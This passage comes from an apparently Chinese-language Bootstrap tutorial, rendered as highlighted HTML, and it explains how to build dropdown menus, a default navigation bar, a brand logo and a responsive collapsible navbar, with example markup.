class="hljs-string">&quot;#&quot;</span>&gt;</span>Swing<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>jMeter<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>EJB<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>PHP<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-导航栏-条"><a href="#2-导航栏-条" class="headerlink" title="2.导航栏(条)"></a>2.导航栏(条)</h2><p>创建一个默认的导航栏的步骤：</p><ul><li>向 <nav> 标签添加  <strong>.navbar、.navbar-default</strong>。</li><li>向上面的元素添加 **role=”navigation”**，有助于增加可访问性。</li><li>向 <div> 元素添加一个标题  <strong>.navbar-header</strong>，内部包含了带有  <strong>navbar-brand</strong> 的 <a> 元素。这会让文本看起来更大一号。</li><li>为了向导航栏添加链接，只需要简单地添加带有  <strong>.nav、.navbar-nav</strong> 的无序列表即可。</li></ul><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">//1<br><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-default&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>墨水记忆<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav navbar-nav&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>iOS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>SVN<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                    Java<br>                    <span class="hljs-tag">&lt;<span class="hljs-name">b</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>jmeter<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>EJB<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Jasper Report<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br><br><br><br><br>//2<br><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-default&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Brand and toggle get grouped for better mobile display --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-toggle collapsed&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;collapse&quot;</span> <span class="hljs-attr">data-target</span>=<span class="hljs-string">&quot;#bs-example-navbar-collapse-1&quot;</span> <span class="hljs-attr">aria-expanded</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>Toggle navigation<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon-bar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon-bar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon-bar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Brand<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Collect the nav links, forms, and other content for toggling --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;collapse navbar-collapse&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bs-example-navbar-collapse-1&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav navbar-nav&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Link <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>(current)<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">aria-haspopup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">aria-expanded</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span>Dropdown <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Another action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Something else here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;separator&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Separated link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;separator&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>One more separated link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-form navbar-left&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Search&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav navbar-nav navbar-right&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">aria-haspopup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">aria-expanded</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span>Dropdown <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Another action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Something else here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;separator&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Separated link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /.navbar-collapse --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /.container-fluid --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-1-LOGO图标"><a href="#2-1-LOGO图标" class="headerlink" title="2.1 LOGO图标"></a>2.1 LOGO图标</h3><p>将导航条内放置品牌标志的地方替换为 <code>&lt;img&gt;</code> 元素即可展示自己的品牌图标。由于 <code>.navbar-brand</code> 已经被设置了内补（padding）和高度（height），你需要根据自己的情况添加一些 CSS 代码从而覆盖默认设置。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-default&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Brand&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-2-响应式导航栏"><a href="#2-2-响应式导航栏" class="headerlink" title="2.2 响应式导航栏"></a>2.2 响应式导航栏</h3><p>为了给导航栏添加响应式特性，您要折叠的内容必须包裹在带有 <code>.collapse</code>、<code>.navbar-collapse</code> 的 <div> 中。折叠起来的导航栏实际上是一个带有  <code>.navbar-toggle</code> 及两个 data- 元素的按钮。第一个是 <code>data-toggle</code>，用于告诉 JavaScript 需要对按钮做什么，第二个是 <code>data-target</code>，指示要切换到哪一个元素。三个带有  <code>.icon-bar</code> 的 <span> 创建所谓的汉堡按钮。这些会切换为 <code>.nav-collapse</code> <div> 中的元素。为了实现以上这些功能，必须包含 Bootstrap 折叠（Collapse）插件。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-default&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;collapse&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">data-target</span>=<span class="hljs-string">&quot;#example-navbar-collapse&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>切换导航<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon-bar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon-bar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon-bar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span 